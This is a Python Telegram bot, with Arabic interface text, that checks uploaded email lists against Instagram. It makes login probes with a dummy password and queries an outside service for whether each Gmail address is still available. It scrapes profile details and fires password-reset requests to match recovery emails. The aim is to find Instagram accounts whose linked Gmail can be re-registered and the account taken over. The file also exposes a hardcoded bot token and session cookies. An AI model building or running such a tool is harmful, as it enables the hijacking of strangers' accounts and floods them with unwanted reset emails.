import telebot
import requests 
import os
import requests
import pyfiglet
import requests,uuid,random,string
import webbrowser
from user_agent import generate_user_agent
from telebot import types 
import json
from user_agent import generate_user_agent 
import time 
from urllib.parse import unquote
import requests
import time
import random
from fake_useragent import UserAgent
us = UserAgent()
UserAgent = us.random


token = "5822995133:AAG2Hm0YHtjcJtyEjERYsjDFbXJIZDMo3Ng"
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
y = '\033[1;35m'#وردي
f = '\033[2;35m'#بنفسجي
z = '\033[3;33m'#اصفر طوخ
bot = telebot.TeleBot(token)
@bot.message_handler(commands=["start"])
def start(message):
    
    listt = message.from_user.id
    
    btn1 = types.InlineKeyboardMarkup(row_width=1)
    
    acc = types.InlineKeyboardButton(text="حسابي",url="https://t.me/B_XXBX")
    btn1.add(acc)
    bot.send_message(message.chat.id,"اهلًا بك في بوت فحص متاحات انستا ارسل اللستة لاقوم بفحصها",reply_markup=btn1)   
@bot.message_handler(content_types=["document"])
def main(message):
    GI = 0
    BI = 0
    GG = 0
    BG = 0
    NOT = 0
    DONE = 0
    BAN = 0
    count = 0
    listt = message.from_user.id
    bo = bot.reply_to(message, "يتم فحص اللستة انتظر قليلًا...⌛")
    

    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open(f"{listt}.txt", "wb") as w:
        w.write(ee)

    try:
        with open(f"{listt}.txt", 'r') as file:
            lines = file.readlines()
            for line in lines:
                email = line.strip()
                PASSWORD = "skjdjdjs8.Udh"
                session = requests.Session()
                session.headers = ({
                    'User-Agent': UserAgent,
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Csrftoken':''.join(random.choice('YqhRSXWMvC91NqaaYkEPvlSGP3oEFEq0')for _ in range(32)),
                });tim = int(time.time())
                data = ({
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{PASSWORD}',
                'username':f'{email}'
                });response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                    headers=session.headers,
                    data=data
                );res = response
                if ('"authenticated":false') in res.text:
                    GI+=1
                    r = requests.get(f"http://ibrahimmaliraq.pythonanywhere.com/ibrahim?email={email}").json()["code"]
                    if r=="Gmail True":
                        GG+=1
                        userrr = email.split("@")[0]
                        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={userrr}"
                        headers = {
                            "Accept": "*/*",
                        
                            "Accept-Language": "ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                            "Cookie": "mid=ZNOHTgABAAG7K-MTFmHvLo2pQvvs; ig_did=9876973D-5277-4E42-B592-42D256385AEF; ig_nrcb=1; dpr=3.2983407974243164; datr=kIfTZMH3xEvBqg0YA06ww11q; csrftoken=YPwLkfh0swJlTPBlhfDecMzAEQSPI10B; ds_user_id=58583600633; shbid=\"10461\\05458583600633\\0541723120642:01f7d736640ca1293f67b2428c0a2a2af9885e27adf6502517a7beed13616b62b5a01728\"; shbts=\"1691584642\\05458583600633\\0541723120642:01f7a64a50329b1d30a34b1db9909f28c6604273a3779a6d54017e66c40b9bf40143b963\"",
                            "Dpr": "3.29834",
                            f"Referer": "https://www.instagram.com/{userrr}/",
                            "Sec-Ch-Prefers-Color-Scheme": "light",
                            "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                            "Sec-Ch-Ua-Full-Version-List": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.61\"",
                            "Sec-Ch-Ua-Mobile": "?0",
                            "Sec-Ch-Ua-Platform": "\"Linux\"",
                            "Sec-Ch-Ua-Platform-Version": "\"\"",
                            "Sec-Fetch-Dest": "empty",
                            "Sec-Fetch-Mode": "cors",
                            "Sec-Fetch-Site": "same-origin",
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
                            "Viewport-Width": "891",
                            "X-Asbd-Id": "129477",
                            "X-Csrftoken": "YPwLkfh0swJlTPBlhfDecMzAEQSPI10B",
                            "X-Ig-App-Id": "936619743392459",
                            "X-Ig-Www-Claim": "0",
                            "X-Requested-With": "XMLHttpRequest"
                        }
                        data = {
                            "username": f"{userrr}"
                        }
                        
                        req = requests.get(url, headers=headers, json=data).json()
                        try:
                            fullname=req['data']['user']['full_name']
                            followers=req['data']['user']['edge_followed_by']['count']
                            following=req['data']['user']['edge_follow']['count']
                            bio=req['data']['user']['biography']
                            post=req['data']['user']['edge_owner_to_timeline_media']['count']
                            id=req['data']['user']['id']
                            z=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
                            date=z['date']
                            head= {
           "accept": "*/*",
          "accept-language": "ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6",
          "sec-ch-prefers-color-scheme": "light",
          "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
          "sec-ch-ua-full-version-list": "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
          "sec-ch-ua-mobile": "?1",
          "sec-ch-ua-platform": "\"Android\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "viewport-width": "412",
          "x-asbd-id": "198387",
          "x-csrftoken": "nVW5MosXQoEr1Rv1Nc4qraggjTdU5pss",
          "x-ig-app-id": "1217981644879628",
          "x-ig-www-claim": "hmac.AR2QM86Qe5fITwAGguadrM-4LVWQ1OQc5RTpaUp_PHZQAkfb",
          "x-requested-with": "XMLHttpRequest"
          }
                            data = {
                               'ig_sig_key_version': '4',
                               "user_id":f'{id}'
                              }
                            hr = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=head, data=data).json()
                            o=hr['obfuscated_email']
                            bn = o.split('@')[0]
                	           
                	           
                            first = email[0]
                	           
                                    
                                    # الحصول على الحرف السادس
                            last = email[email.index('@') - 1]
                                    
                	           
                            lloo=f"""
            BaD info 
            
            Username : {userrr}
            Email : {email}
            Fullname : {fullname}
            Followers : {followers}
            Following : {following}
            Bio : {bio}
            Post : {post}
            Id : {id}
            date : {date}
            ------------- dev : @B_XXBX-------------"""
                            llo=f"""
            GooD info 
            
            Username : {userrr}
            Email : {email}
            Fullname : {fullname}
            Followers : {followers}
            Following : {following}
            Bio : {bio}
            Post : {post}
            Id : {id}
            date : {date}
            ------------- dev : @B_xxBx -------------"""
                	               
                    	           
                            if first and last in bn:
                                print(llo)
                                bot.send_message(message.chat.id ,f"{llo}")
                            else:
                                print(lloo)
                                bot.send_message(message.chat.id ,f"{lloo}")
                    	           
                        except:
                            print(f' Error UserName : {userrr}')
                	
                	    
                    else:
                        BG+=1
                	    
        
                else:
                    
                    BI+=1
                count+=1
                
                
                btn4 = types.InlineKeyboardMarkup(row_width=1)
                godi = types.InlineKeyboardButton(f"GOOD INSTA : {GI}",callback_data="a")
                godg = types.InlineKeyboardButton(f"GOOD GMAIL : {GG}",callback_data="b")
                badg= types.InlineKeyboardButton(f"BAD GMAIL : {BG}",callback_data="c")
                badi= types.InlineKeyboardButton(f"BAD INSTA : {BI}",callback_data="c")
                chech = types.InlineKeyboardButton(f"- {count} - {email}",callback_data="kh")
                btn4.add(chech,godi,godg,badg,badi)
                
                bot.edit_message_text(chat_id=message.chat.id ,message_id=bo.message_id ,text= "لقد تم بدأ عملية الفحص انتظر لحين انتهاء الفحص وشكرًا",reply_markup=btn4)
    except Exception as e:
        # معالجة الأخطاء هنا إذا لزم الأمر
        print("An error occurred:", str(e))
bot.polling()
    
        
                 
        
    
